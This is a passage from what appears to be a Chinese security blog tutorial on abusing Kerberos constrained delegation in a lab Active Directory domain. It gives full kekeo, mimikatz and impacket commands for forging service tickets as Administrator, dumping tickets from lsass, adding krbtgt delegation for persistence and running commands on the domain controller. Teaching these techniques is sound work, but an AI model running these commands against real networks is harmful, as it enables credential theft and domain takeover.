alt="image-20230930161630690"></p><p>执行命令可以用<code>WinRM</code>服务来远程连接域控</p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>   <strong>这篇文章的话是总结了目前常用的基于约束委派的强制身份验证漏洞</strong></p><h2 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>由于非约束委派的不安全性，微软在<code>windows server 2003</code>中引入了约束委派，对Kerberos协议进行了拓展，引入了<code>S4U</code>，其中<code>S4U</code>支持两个子协议：<code>Service for User to Self (S4U2Self)</code>和 <code>Service for User to Proxy (S4U2proxy)</code>，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self</code>可以代表自身请求针对其自身的Kerberos服务票据(ST)；<code>S4U2proxy</code>可以以用户的名义请求其它服务的ST，约束委派就是限制了<code>S4U2proxy</code>扩展的范围。</p><p><strong>约束委派（Constrained Delegation）即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS ，从而只能模拟用户访问特定的服务，这也相对应非约束委派更安全一些。</strong></p><ul><li><code>S4U2self</code> (Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个<strong>服务账户</strong>的 userAccountControl 标志为 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, 则其可以<strong>代表任何其他用户</strong>获取自身服务的 TGS/ST。</li><li><code>S4U2proxy</code>(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以<strong>代表任何用户</strong>获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。</li></ul><p><strong>S4U2self</strong>：</p><p>(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p><p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p><p>(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</p><p>(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</p><p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p><p><strong>S4U2proxy</strong>:</p><p>(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</p><p>(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</p><p>(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p><p>(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p><p>(9) service2 响应步骤 8 的请求。</p><p>(10) service1 响应用户对步骤 5 中的请求。</p><p><strong>总结</strong></p><p>其实约束委派就是限制了<strong>S4U2proxy</strong> 这一部分  就是只能获取到用户访问服务的ST  不能获取到用户的TGT了</p><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li><li>域内主机：<code>DM08</code></li></ul><p><code>DM08</code>是域内的另外一台主机，下面我们设置了服务用户<code>qiyou</code>对<code>DM08</code>的<code>cifs</code>服务的委派</p><p><img src="../images/image-20230930170007987.png" alt="image-20230930170007987"></p><p>概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p><p><strong>简单点讲 </strong></p><blockquote><p>就是因为约束委派是不能使用<strong>S4U2proxy</strong>的   那么服务账户就只能获取到用户的ST  那么如果我们获取到了服务账户的密码或者ntlm的hash值  那么我们就可以进行ST的伪造 从而访问自己想要访问的服务</p></blockquote><p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure><p><code>/user</code>: 服务用户的用户名</p><p><code>/password</code>: 服务用户的明文密码</p><p><code>/domain</code>: 所在域名</p><p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p><p><img src="../images/image-20230930171523675.png" alt="image-20230930171523675"></p><p>得到服务用户TGT：<code>TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi</code></p><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>dm08 CIFS</code>的ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><strong>这里能伪造成功是因为这个服务账户的TGT是能访问这个cifs服务  然后我们使用他骗过了域管  然后成功伪造了ST</strong></p><p><strong>(能成功伪造这个域管用户Administrator成功的原因是因为这个KDC验证的话是只查找该用户是否存在   并不会判断其身份的可靠性)</strong></p><p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的dm08 CIFS服务的ST2会保存在当前目录下</p><p>然后我们用mimikatz将ST2导入当前会话即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p>成功访问到dm08的cifs服务</p><p><img src="../images/image-20230930172217655.png" alt="image-20230930172217655"></p><p>上面是知道服务用户明文的情况下，kekeo同样也支持使用<code>NTLM Hash</code></p><p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p><p>已知我们服务账号<code>qiyou</code>的<code>NTLM hash</code>是<code>b4f27a13d0f78d5ad83750095ef2d8ec</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930172252504.png" alt="image-20230930172252504"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930172318778.png" alt="image-20230930172318778"></p><p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173327785.png" alt="image-20230930173327785"></p><p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p><p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;196b1e4]-2-0-60a00000-qiyou@krbtgt-QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173522455.png" alt="image-20230930173522455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930173538750.png" alt="image-20230930173538750"></p><h3 id="利用约束委派生成黄金票据"><a href="#利用约束委派生成黄金票据" class="headerlink" title="利用约束委派生成黄金票据"></a>利用约束委派生成黄金票据</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域控：<code>windows server 2008R2</code>，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li><li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li></ul><p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p><p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p><p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p><p>我们可以使用powershell来添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser qiyou</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/qiyou.com&quot;) &#125;</span><br></pre></td></tr></table></figure><p>我们可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password</span><br></pre></td></tr></table></figure><p><strong>(解释一下这里的这样干的原因  因为我们添加了服务账户  并且这个服务账户时约束这个krbtgt服务的   然后我们就有了访问这个服务的权限  并且因为这个服务是可以用来生成TGT的  所以我们就可以成功伪造 )</strong></p><p>-impersonate：表示伪造用户</p><p>-spn：表示我们要委派的服务的spn，这里是TGS</p><p>-dc-ip：域控ip</p><p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code></p><p><img src="../images/image-20230930174306259.png" alt="image-20230930174306259"></p><p>然后用mimikatz进行<code>ptc</code>（pass the cache），将缓存注入当前会话中</p><p><img src="../images/image-20230930174333936.png" alt="image-20230930174333936"></p><p>klist查看缓存的票据</p><p><img src="../images/image-20230930174346596.png" alt="image-20230930174346596"></p><p>访问域控</p><p><img src="../images/image-20230930174409252.png" alt="image-20230930174409252"></p><p>执行命令的话我们可以用<code>impacket</code>系列或者<code>powershell</code>都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip 192.168.141.145</span><br><span class="line"></span><br><span class="line">pth攻击其实也行  先dump出hash  然后再打</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7083788949482635271#heading-7&quot;&gt;参考文章1&lt;/a&gt;  &lt;a href=&quot;https://xz.aliyun.com/t/7217#toc-9&quot;&gt;参考文章—xz社区&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
